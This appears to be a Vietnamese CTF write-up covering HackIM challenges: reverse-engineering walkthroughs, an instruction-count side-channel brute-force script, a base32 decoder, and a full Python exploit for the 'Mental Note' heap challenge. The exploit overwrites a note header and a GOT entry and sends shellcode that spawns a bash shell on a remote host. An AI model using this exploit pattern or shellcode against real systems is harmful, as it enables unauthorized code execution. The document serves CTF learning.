+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?ssl=1"><img data-attachment-id="269" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_7/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" data-orig-size="413,56" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_7" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=300%2C41&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" class="alignnone size-full wp-image-269" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=413%2C56&#038;ssl=1" alt="upx_7" width="413" height="56" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?w=413&amp;ssl=1 413w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=300%2C41&amp;ssl=1 300w" sizes="(max-width: 413px) 100vw, 413px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">sub_401b60 -&gt; sub_401600 -&gt; call eax
+new entry point =  08001563</pre>
+<p>sài HxD (hex editor) view ram process upx.exe tại địa chỉ đó thì thấy nguyên session từ 0x08000000 -&gt; 0x0800FFFF là 1 file PE mới,</p>
+<p>search string thì thấy có dòng "You didn't ask nicely" và đặc biệt là "-pl34se-give-me-th3-k3y" :-ss</p>
+<p>tới đây các bạn có thể extract ra 1 file exe mới và disass nghiên cứu (ko chắc là sẽ chạy đc ok), còn mình thì thấy nó có dạng 1 file ms c++ nữa nên so sánh structure với cái PE gốc để tìm addr winMain</p>
+<pre class="lang:default decode:true ">địa chỉ 0x08001100</pre>
+<p>quá trình dịch cũng tương tự, bài mới này cũng không quá khó.</p>
+<pre class="lang:default decode:true ">st = command_line_string
+st[len(st)-1] = \x00
+
+if st[len(st)]==\x20:
+	if !strcmp(st, "-pl34se-give-me-th3-k3y"):
+		func_flag()
+		exit()
+msgbox("You not nicely");</pre>
+<p>patch luôn cho lẹ, patch luôn chỗ strcmp và trong func_flag (0x08001000) có 1 chỗ gọi isDebuggerPresent (0x08001024)</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?ssl=1"><img data-attachment-id="270" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_8/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" data-orig-size="421,108" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_8" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=300%2C77&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" class="alignnone size-full wp-image-270" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=421%2C108&#038;ssl=1" alt="upx_8" width="421" height="108" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?w=421&amp;ssl=1 421w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=300%2C77&amp;ssl=1 300w" sizes="(max-width: 421px) 100vw, 421px" data-recalc-dims="1" /></a></p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?ssl=1"><img data-attachment-id="271" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_9/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" data-orig-size="581,138" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_9" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=300%2C71&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" class="alignnone size-full wp-image-271" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=581%2C138&#038;ssl=1" alt="upx_9" width="581" height="138" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?w=581&amp;ssl=1 581w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=300%2C71&amp;ssl=1 300w" sizes="(max-width: 581px) 100vw, 581px" data-recalc-dims="1" /></a></p>
+<p>Done.</p>
+<p>----------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 400 - fin64</span></h2>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ file fin64
+fin64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x9b62a9678a30ce6c576131024148154a0bc5575d, stripped</pre>
+<p>khi chạy và thử nhiều cách input, đều có kết quả "Not yet.."</p>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ ./fin64
+Not yet..</pre>
+<p>main khá ngắn, ta dịch lần lượt<br />
+để ý, có 2 cái good_boy và bad_boy trong hình</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?ssl=1"><img data-attachment-id="274" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_1/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=657%2C306&amp;ssl=1" data-orig-size="657,306" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_1" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=300%2C140&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=604%2C281&amp;ssl=1" class="alignnone size-full wp-image-274" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=604%2C281&#038;ssl=1" alt="fin64_1" width="604" height="281" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?w=657&amp;ssl=1 657w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=300%2C140&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>đầu tiên là func_systime<br />
+gọi syscall 0xc9 để lấy timestamp sao đó lưu giá trị vào [rbp-18h]</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?ssl=1"><img data-attachment-id="275" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" data-orig-size="515,294" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=300%2C171&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" class="alignnone size-full wp-image-275" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=515%2C294&#038;ssl=1" alt="fin64_2" width="515" height="294" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?w=515&amp;ssl=1 515w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=300%2C171&amp;ssl=1 300w" sizes="(max-width: 515px) 100vw, 515px" data-recalc-dims="1" /></a></p>
+<p>func_ctime - convert timestamp thành giá trị giây:phút:giờ:ngày:tháng:năm =&gt; lưu vào [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?ssl=1"><img data-attachment-id="276" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" data-orig-size="477,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=300%2C82&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" class="alignnone size-full wp-image-276" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=477%2C131&#038;ssl=1" alt="fin64_3" width="477" height="131" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?w=477&amp;ssl=1 477w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=300%2C82&amp;ssl=1 300w" sizes="(max-width: 477px) 100vw, 477px" data-recalc-dims="1" /></a></p>
+<p>dừng ở đây, jump ngược từ good_boy và bad_boy ta thấy có đoạn sử dụng [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?ssl=1"><img data-attachment-id="277" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_4/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" data-orig-size="442,380" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_4" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=300%2C258&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" class="alignnone size-full wp-image-277" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=442%2C380&#038;ssl=1" alt="fin64_4" width="442" height="380" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?w=442&amp;ssl=1 442w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=300%2C258&amp;ssl=1 300w" sizes="(max-width: 442px) 100vw, 442px" data-recalc-dims="1" /></a></p>
+<p>nếu [rbp-10h] ở không bị thay đổi thì đoạn code pseudo ntn:</p>
+<pre class="lang:default decode:true ">[rbp-24h] = [dw_time+16]+1 = tháng
+[rbp-20h] = [dw_time+12] = ngày
+[rbp-1ch] = [dw_time+20] + 1900 = năm
+if ( [rbp-24h] == 9 &amp;&amp; [rbp-20h] == 10 &amp;&amp; [rbp-1ch] == 2011 )
+	good_boy
+else
+	bad_boy</pre>
+<p>thử đặt lại time là 10/9/2011 và run =&gt; still failed :wth:</p>
+<p>giờ ta jump back từ đoạn compare trên đến ngay sau chỗ convert, patch những đoạn jump để bypass khoảng ở giữa và chạy lại 1 lần nữa</p>
+<pre class="lang:default decode:true ">$ ./fin64
+Oops..</pre>
+<p>Good bj, mình đoán flag nằm trong memory, thử trace dần vào good_boy</p>
+<p>thì phát hiện ra cái này *byte_6c2070</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?ssl=1"><img data-attachment-id="278" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_5-2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=789%2C214&amp;ssl=1" data-orig-size="789,214" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_5" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=300%2C81&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=604%2C164&amp;ssl=1" class="alignnone size-full wp-image-278" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=604%2C164&#038;ssl=1" alt="fin64_5" width="604" height="164" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?w=789&amp;ssl=1 789w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=300%2C81&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>next-challenge</p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 500 - cso</span></h2>
+<p>bài này thực sự không biết nên viết writeup như thế nào vì công nhận là nó khá bựa và cách làm cũng ngẫu hứng vãi nhái :3</p>
+<p>sau hồi dịch mình chả biết nó là cái giống gì, có vẻ giống virtual machine nhưng cũng ko giống lắm =)), đại khái nó như này:</p>
+<pre class="lang:python decode:true ">main:
+	print(Bla bla bla)
+	gets(st) #main input
+	len_st = strlen(st)
+	super = 0x24ae5af1 #first magic hex
+	while True:
+		A: 
+			if super-a1&gt;0: jump b1
+		B: 
+			if super-a2&gt;0: jump b2
+		C: 
+			if super-a3&gt;0: jump b3
+		...
+		V: 
+			if super-an&gt;0: jump bn
+		X:
+			super = a(n+1)
+		Y:
+			super = a(n+2)
+		...
+		Z:
+			super = am
+		quit:
+			break
+		dead: 
+			puts("You are dead man")
+			super = super_to_quit
+			continue
+		win: 
+			puts("You are safe and live forever")
+			super = super_to_quit
+			continue
+		check_len: 
+			if len_st==0x1A: 
+				super = super_to_stage2
+			else:
+				super = super_to_dead
+			continue
+		stage_2:
+			#func_stage2 ở địa chỉ 0x00400ec0
+			if func_stage2(st)==1: 
+				super = super_to_win
+			else:
+				super=super_to_dead
+			continue
+
+#mấy số a1, a2, ...an, a(n+1), ... , am là magic const, ko biết có quy luật gì những mà nó đc build để tính toán hợp lí
+#các jump b1, b2, b3, ... bn là nhãn của một trong mấy thằng A,B,C,...V, quit, dead, win, check_len, stage_2
+
+			
+def stage2(st):
+	#cấu trúc đệ quy
+	#vòng lặp tương tự main
+	#có thêm 1 số sub function phụ</pre>
+<p>Không biết flag ở chỗ nào luôn, code follow control dựa vào mấy phép cộng của a(i), giờ tìm quy luật cho nó cũng đuối đơ. Có duy nhất 1 cái chắc chắn là len_st = 0x1A = 26 (!!!)</p>
+<p>Sau nửa tiếng suy nghĩ, mình thấy khi input với len = 26 và len &lt; 26 thì cảm giác debug lâu hơn. Suy nghĩ: Side channel dựa vào instruction count được không?</p>
+<pre class="lang:sh decode:true ">$ python -c "print 'a'*26" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123368
+
+$ python -c "print 'a'*25" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097
+
+$ python -c "print 'a'*24" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097</pre>
+<p>Bingo, chuẩn girl mất rồi, side channel bem lần lượt các char</p>
+<pre class="lang:python decode:true">import subprocess
+import time
+
+sam = "abcdefghijklmnopqrstuvwxyz"
+sam += sam.upper()
+sam += "0123456789_!,.{}"
+
+#217826 SRRDRSSRSRRDDSSSRSSDSDDDSS
+
+def insco(fl):
+	fl += 'a'*(26-len(fl))
+	open('hellyeah','wt').write(fl)
+	subprocess.call("./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ../cso &lt; hellyeah", shell=True)
+	time.sleep(0.2)
+	k = open("inscount.out").read().strip().split(' ')[1]
+	print "-----", fl, k
+	return int(k)
+
+def dequy(fl):
+	if len(fl)==26:
+		print fl
+		raw_input("&lt;&lt; Another result, enter for the next...")
+	else:
+		a = insco(fl + 'a')
+		#Cho nay sample chi co 1 ki tu trong string "SRD" thoi (manual check), co the set sam = "SRD" side channel nhanh hon
+		for c in sam:
+			cou = insco(fl + c)
+			if cou-a&gt;400: dequy(fl + c)
+
+
+dequy('')</pre>
+<p>=&gt; Final <span style="color: #ff0000;">SRRDRSSRSRRDDSSSRSSDSDDDSS</span>. Không giống flag cho lắm :-ss</p>
+<p>Input test lại vẫn "You are dead man". Wut dafuq, đúng quá rồi còn gì.<br />
+Check lại cái inscount thì thấy có sự chênh lệch rất lớn ins.<br />
+Có thể là những mini-sub trong stage2 (0x00400ec0)<br />
+Kiểm tra lần lượt từng mini-sub đó ta thấy có sub_400BD0 sử dụng biến global(s) chính là string input ban đầu?!?</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?ssl=1"><img data-attachment-id="280" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_1/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" data-orig-size="532,82" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_1" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=300%2C46&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" class="alignnone size-full wp-image-280" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=532%2C82&#038;ssl=1" alt="cso_1" width="532" height="82" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?w=532&amp;ssl=1 532w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=300%2C46&amp;ssl=1 300w" sizes="(max-width: 532px) 100vw, 532px" data-recalc-dims="1" /></a></p>
+<p>Đặt breakpoint ngay tại đó và input đúng như trên, sau 1 số lần trace thì ...</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?ssl=1"><img data-attachment-id="281" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" data-orig-size="503,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=300%2C78&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" class="alignnone size-full wp-image-281" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=503%2C131&#038;ssl=1" alt="cso_2" width="503" height="131" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?w=503&amp;ssl=1 503w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=300%2C78&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a><br />
+Âu Mai Gót, call cái địa chỉ vừa trả về, không phải run shell thì là run cái gì nữa =))</p>
+<p>Chuyển hướng sang disass con shell, tương tự 3 bài rồi</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?ssl=1"><img data-attachment-id="279" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" data-orig-size="503,230" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=300%2C137&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" class="alignnone size-full wp-image-279" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=503%2C230&#038;ssl=1" alt="cso_3" width="503" height="230" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?w=503&amp;ssl=1 503w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=300%2C137&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a></p>
+<p>move rất nhiều ASCII Char vào memory, ghép lại thì thấy đó là 1 chuỗi base32 <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f61b.png" alt="😛" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>Hard time gone <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f61b.png" alt="😛" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<pre class="lang:python decode:true">s = "MZWGCZ33NV4V6YZQNVYDINJVL4YTKX3VNYYXC5JTPU"
+sam = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+
+def tobin(t):
+    st = bin(t).replace('0b','')
+    st = '0'*(5-len(st)) + st
+    return st
+
+k = ''
+for i in s:
+    t = sam.find(i)
+    print i, sam.find(i), tobin(t)
+    k += tobin(t)
+
+k = k[0:208]
+print hex(int(k,2))[2:].replace('L','').decode('hex')</pre>
+<p><span style="color: #ff0000;"><strong>flag{my_c0mp455_15_un1qu3}</strong></span></p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">PWN 400 - Mental Note</span></h2>
+<p>bài này về cơ bản khá giống <a title="PWN500 - mixme" href="https://babyphd.net/2015/01/write-up-hackim-ctf-mixme-pwn5/" target="_blank">mixme</a></p>
+<p>cấu trúc dữ liệu:</p>
+<pre class="lang:c decode:true">struct note{
+	int size;
+	note* next_note;
+	note* prev_note;
+	content[linh động]
+}</pre>
+<p>và array_note[999] lưu địa chỉ con trỏ của mỗi note được thêm</p>
+<p>có 3 loại note:</p>
+<pre class="lang:default decode:true ">loại 0 : content 100 bytes
+loại 1 : content 200 bytes
+loại 2 : content 400 bytes</pre>
+<p>* add-note, người dùng nhập 1 loại note sau đó chương trình malloc 1 lượng bộ nhớ vừa đủ phần header+content size =&gt; new_note</p>
+<p>new_note được insert vào array_note sau khi đã check-note (dựa vào note header) để tìm id phù hợp.</p>
+<p>* edit-note, người dùng nhập id, loại note và read(note-id-content, size=note-type) mà ko check xem note ở id ấy có đúng loại không.<br />
+=&gt; nếu note add vào là loại 0 mà khi edit với loại 1/2 thì sẽ overwrite được sang header note khác.</p>
+<p>bằng cách này ta sẽ chỉnh phần header của note kế tiếp để khai thác lỗi check-note của add-note function.</p>
+<p>Payload:</p>
+<pre class="lang:python decode:true ">import socket, time
+
+def send(s, m):
+    print "[SEND]", m
+    s.send(m)
+
+def recv(s):
+    t = s.recv(4096)
+    print "[RECV]", t
+    return t
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect (( "54.163.248.69",9004 ))
+
+recv(s)
+recv(s)
+
+#Add 3 notes, Type 0
+for i in range(3):
+	send(s, "1\n")
+	recv(s)
+	send(s, "0\n")
+	recv(s)
+
+#Edit note id=2, Type=0, shellcode
+send(s, "3\n")
+recv(s)
+send(s, "2\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+#shell
+shell = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+send(s, "\x90"*20 + shell)
+recv(s)
+
+#Edit note id=0, Type=1, overwrite header and change g0t.plt
+send(s, "3\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+send(s, "1\n")
+recv(s)
+#magic bytes
+send(s, (0x80-12)*'a' + "\x04\xc1\xeb\x0f\x1c\xb0\x04\x08")
+recv(s)
+
+#jump to shellcode by function was changed in g0t.plt
+send(s, "1\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+
+send(s,"cat flag.txt\n")
+recv(s)
+
+#flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
+
+s.close()</pre>
+<p><span style="color: #ff0000;"><strong>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</strong></span> !!!</p>
+<p><em>So long and deep, go get some sleep :'( . Chim!</em></p>
+]]></content:encoded>
